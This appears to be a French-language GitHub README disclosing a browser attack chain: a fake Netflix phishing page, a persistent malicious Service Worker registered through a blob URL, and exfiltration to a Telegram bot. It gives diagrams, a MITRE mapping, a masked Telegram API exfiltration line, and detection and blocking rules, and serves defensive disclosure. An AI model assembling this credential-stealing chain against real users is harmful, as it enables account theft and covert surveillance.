# 🔐 Recherche en Sécurité — Phishing Avancé + Persistance Service Worker + Exfiltration C2 Telegram

<div align="center">

![Statut](https://img.shields.io/badge/Statut-Divulgation%20Responsable-green)
![Sévérité](https://img.shields.io/badge/Sévérité-CRITIQUE%20CVSS%209.1-red)
![Classification](https://img.shields.io/badge/TLP-WHITE-brightgreen)
![Plateforme](https://img.shields.io/badge/Plateforme-Tous%20navigateurs%20modernes-blue)
![Auteur](https://img.shields.io/badge/Chercheur-ML-purple)

</div>

---

> **⚠️ AVERTISSEMENT LÉGAL ET ÉTHIQUE**
>
> Ce dépôt est produit **exclusivement dans un cadre de recherche défensive** et à des fins **pédagogiques pour la communauté cybersécurité**.
> Toutes les recherches ont été conduites dans un environnement isolé (machine virtuelle sans accès réseau de production).
> Aucun token, identifiant ou credential réel n'est publié ici.
> Aucun code fonctionnel exploitable n'est présent dans ce dépôt.
> Toute utilisation malveillante est contraire à la loi et à l'éthique de la recherche en sécurité.

---

## 📖 Table des Matières

- [Présentation de la Recherche](#-présentation-de-la-recherche)
- [Architecture de l'Attaque](#-architecture-de-lattaque)
- [Flux d'Exécution Complet](#-flux-dexécution-complet)
- [Mapping MITRE ATT\&CK](#-mapping-mitre-attck)
- [Mitigations Rapides](#-mitigations-rapides)
- [Structure du Dépôt](#-structure-du-dépôt)
- [Divulgation Responsable](#-divulgation-responsable)

---

## 🎯 Présentation de la Recherche

Cette recherche documente une **chaîne d'attaque tri-couche** découverte lors d'une analyse de vecteurs d'infection navigateur. Sa particularité est d'utiliser **uniquement des APIs web légitimes**, ce qui la rend invisible aux antivirus conventionnels.

### Pourquoi cette attaque est dangereuse

| Facteur | Explication |
|--------|-------------|
| 🔍 **Indétectable par l'AV** | N'utilise que des APIs navigateur légitimes — aucune signature malware |
| 👁️ **Invisible à la victime** | Aucune alerte, aucune popup suspecte après infection |
| ♾️ **Persistance longue durée** | Le Service Worker survit à la fermeture du navigateur et au redémarrage |
| 📡 **C2 indétectable** | Exfiltration via `api.telegram.org` (HTTPS) — rarement bloqué |
| ⚡ **Infection en 1 clic** | Une seule visite de la page suffit à compromettre le navigateur |
| 📈 **Scalable** | Une page peut infecter des milliers de victimes simultanément |

---

## 🏗️ Architecture de l'Attaque

L'attaque s'articule autour de **trois couches indépendantes mais synergiques** :

```
╔══════════════════════════════════════════════════════════════════════╗
║                    ARCHITECTURE GLOBALE DE L'ATTAQUE                ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  ┌─────────────────┐   ┌─────────────────┐   ┌─────────────────┐   ║
║  │   COUCHE  1     │   │   COUCHE  2     │   │   COUCHE  3     │   ║
║  │                 │   │                 │   │                 │   ║
║  │   🎣 LEURRE     │──▶│ 👷 PERSISTANCE  │──▶│  📡 EXFILTRATION│   ║
║  │                 │   │                 │   │                 │   ║
║  │  Page Phishing  │   │ Service Worker  │   │  Bot Telegram   │   ║
║  │  (Netflix fake) │   │  (navigateur)   │   │  API (HTTPS C2) │   ║
║  └─────────────────┘   └─────────────────┘   └─────────────────┘   ║
║          │                      │                      │            ║
║          ▼                      ▼                      ▼            ║
║  Ingénierie sociale      Interception de         Exfiltration       ║
║  + vol credentials       toutes les              temps réel         ║
║  en 2 étapes             requêtes réseau         chiffrée HTTPS     ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

### Couche 1 — Page de Phishing

```
┌─────────────────────────────────────────────────────────────────┐
│                    PAGE DE PHISHING NETFLIX                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Techniques d'ingénierie sociale utilisées :                   │
│                                                                 │
│  ① Fausse rareté ──────── "53 comptes restants"               │
│     └─ Biais cognitif : Aversion à la perte                    │
│                                                                 │
│  ② Urgence artificielle ── Compte à rebours animé 04:59       │
│     └─ Biais cognitif : Pression temporelle                    │
│                                                                 │
│  ③ Preuve sociale ─────── "1 284 utilisateurs actifs"         │
│     └─ Biais cognitif : Comportement grégaire                  │
│                                                                 │
│  ④ Crédibilité visuelle ── Couleurs/logo Netflix exactes      │
│     └─ Biais cognitif : Biais d'autorité                       │
│                                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  FORMULAIRE 1 (visible)   → Email + Nom utilisateur │      │
│  └──────────────────────────────────────────────────────┘      │
│                          ↓ Soumission                           │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  POPUP (SESSION EXPIRÉE)  → Email + MOT DE PASSE    │ ◀ !!│
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Couche 2 — Service Worker Malveillant

```
┌─────────────────────────────────────────────────────────────────┐
│                    SERVICE WORKER MALVEILLANT                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Mécanisme d'installation :                                    │
│                                                                 │
│  Code SW (string JS)                                           │
│       │                                                         │
│       ▼                                                         │
│  new Blob([code])   ← Injection dynamique (évite détection)   │
│       │                                                         │
│       ▼                                                         │
│  URL.createObjectURL()  ← Génère blob:https://.../<uuid>      │
│       │                                                         │
│       ▼                                                         │
│  navigator.serviceWorker.register(blobURL)                     │
│       │                                                         │
│       ▼                                                         │
│  ✅ SW actif — scope: /  ← Contrôle TOUTES les requêtes       │
│                                                                 │
│  Capacités une fois installé :                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │ ① Intercept fetch /api/* et /graphql → vol JSON     │      │
│  │ ② Intercept POST /login, /auth → vol credentials    │      │
│  │ ③ Background Sync → envoi offline                   │      │
│  │ ④ skipWaiting() → activation immédiate             │      │
│  │ ⑤ clients.claim() → contrôle instantané            │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ⚠️  Persiste après fermeture du navigateur                    │
│  ⚠️  Invisible dans l'interface utilisateur normale            │
│  ⚠️  Seul moyen de détecter : DevTools → Application → SW     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Couche 3 — Canal C2 Telegram

```
┌─────────────────────────────────────────────────────────────────┐
│                     CANAL C2 TELEGRAM                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Victime (navigateur infecté)                                  │
│       │                                                         │
│       │  POST https://api.telegram.org/bot[TOKEN]/sendMessage  │
│       │  Content-Type: application/json                        │
│       │  ← HTTPS chiffré, port 443 standard ←                 │
│       │                                                         │
│       ▼                                                         │
│  Serveurs Telegram  ──────────────────▶  Bot attaquant        │
│  (CDN mondial)                           (Chat privé)          │
│                                                                 │
│  Données exfiltrées en temps réel :                            │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Dès le chargement  → Adresse IP + User-Agent        │      │
│  │  Clic "Générer"     → Email + Nom utilisateur        │      │
│  │  Popup phishing     → Email + Mot de passe RÉEL      │      │
│  │  Post-infection     → Toutes les requêtes API        │      │
│  │  Post-infection     → Tous les formulaires POST      │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  Pourquoi c'est difficile à bloquer :                          │
│  ✗ api.telegram.org est souvent en whitelist proxy            │
│  ✗ Trafic chiffré HTTPS — inspection difficile                │
│  ✗ Aucune anomalie DNS — domaine légitime connu               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔄 Flux d'Exécution Complet

```
VICTIME                        PAGE PHISHING                    ATTAQUANT
   │                                │                               │
   │──── Visite la page ──────────▶│                               │
   │                                │──── IP + UserAgent ─────────▶│
   │◀─── Affichage Netflix fake ───│                               │
   │                                │                               │
   │──── Remplit formulaire ───────▶│                               │
   │     (nom, email, plan)         │──── Email + Nom ────────────▶│
   │                                │                               │
   │                                │ Installe Service Worker       │
   │                                │ (blob: URL, silencieux)       │
   │                                │──── "SW INSTALLÉ" ──────────▶│
   │                                │                               │
   │◀─── Popup SESSION EXPIRÉE ────│                               │
   │                                │                               │
   │──── Saisit email + mdp ───────▶│                               │
   │                                │──── CREDENTIALS RÉELS ──────▶│
   │                                │                               │
   │◀─── "Connexion réussie" ──────│                               │
   │                                │                               │
   │ (Ferme le navigateur)          │                               │
   │                                │                               │
   │ (Rouvre le navigateur)         │                               │
   │──── Visite n'importe           │                               │
   │     quel site (même domaine) ─▶│                               │
   │                                │ SW se réactive automatiquement│
   │                                │──── "SW RÉACTIVÉ" ──────────▶│
   │                                │                               │
   │──── Requête API quelconque ───▶│ SW intercepte                 │
   │◀─── Réponse normale ──────────│──── Données API ────────────▶│
   │                                │                               │
   │ (Victime ne remarque rien)     │         [CONTINU]             │
```

---

## 🗺️ Mapping MITRE ATT&CK

```
TACTIQUE              TECHNIQUE                           ID            SÉVÉRITÉ
─────────────────────────────────────────────────────────────────────────────────
Initial Access    ──▶ Spearphishing via lien/page       T1566.002     🔴 Critique
Persistence       ──▶ Abus Service Worker navigateur    T1176         🔴 Critique
Credential Access ──▶ Vol depuis formulaires web        T1555.003     🔴 Critique
Collection        ──▶ Man-in-the-Browser (MitB)         T1185         🔴 Critique
Exfiltration      ──▶ Exfiltration vers service web     T1567.002     🟠 Élevé
Exfiltration      ──▶ Background Sync (transfert diff.) T1029         🟠 Élevé
Reconnaissance    ──▶ Collecte adresse IP victime       T1590.005     🟡 Moyen
```

---

## 🛡️ Mitigations Rapides

### Header HTTP — Protection CSP

```apache
# ✅ Bloquer les Service Workers non autorisés (Apache)
Header always set Content-Security-Policy \
  "default-src 'self'; \
   worker-src 'self'; \
   connect-src 'self'; \
   script-src 'self'"
```

### Règle Proxy/Firewall

```
# ✅ Bloquer l'exfiltration Telegram depuis les navigateurs
DENY  POST  https://api.telegram.org/bot*
  WHEN  User-Agent CONTAINS "Mozilla"
  LOG   ALERT "Possible C2 Telegram navigateur détecté"
```

### Règle SIEM (Sigma)

```yaml
# ✅ Détection appel Telegram Bot API depuis processus navigateur
title: Exfiltration C2 Telegram via navigateur
level: critical
detection:
  selection:
    http.url|contains: 'api.telegram.org/bot'
    http.user_agent|contains|any: ['Mozilla', 'Chrome', 'Firefox']
  condition: selection
```

---

## 🗂️ Structure du Dépôt

```
📁 research-phishing-sw-c2/
├── 📄 README.md                     ← Ce fichier (vue d'ensemble)
├── 📄 RAPPORT_DIVULGATION.md        ← Rapport technique complet
├── 📁 ioc/
│   └── 📄 indicateurs.md            ← IOC réseau et navigateur
├── 📁 detection/
│   ├── 📄 regles_yara.yar           ← Règles YARA statiques
│   ├── 📄 regles_sigma.yml          ← Règles Sigma SIEM
│   └── 📄 regles_proxy.conf         ← Règles proxy/firewall
└── 📁 mitigations/
    └── 📄 playbook_blue_team.md     ← Procédure IR complète
```

---

## 📬 Divulgation Responsable

- ✅ Token Bot et Chat ID masqués dans tous les fichiers publics
- ✅ Transmis de manière confidentielle aux autorités compétentes
- ✅ Signalement à Telegram Security : abuse@telegram.org
- ✅ Rapport transmis au CERT national
- ✅ Aucun code fonctionnel exploitable publié

---

## 📚 Rapport Complet

➡️ Voir [`RAPPORT_DIVULGATION.md`](./RAPPORT_DIVULGATION.md) pour l'analyse technique exhaustive.

---

<div align="center">

*Recherche conduite par **ML** — Divulgation Responsable — TLP:WHITE — 2026*

</div>
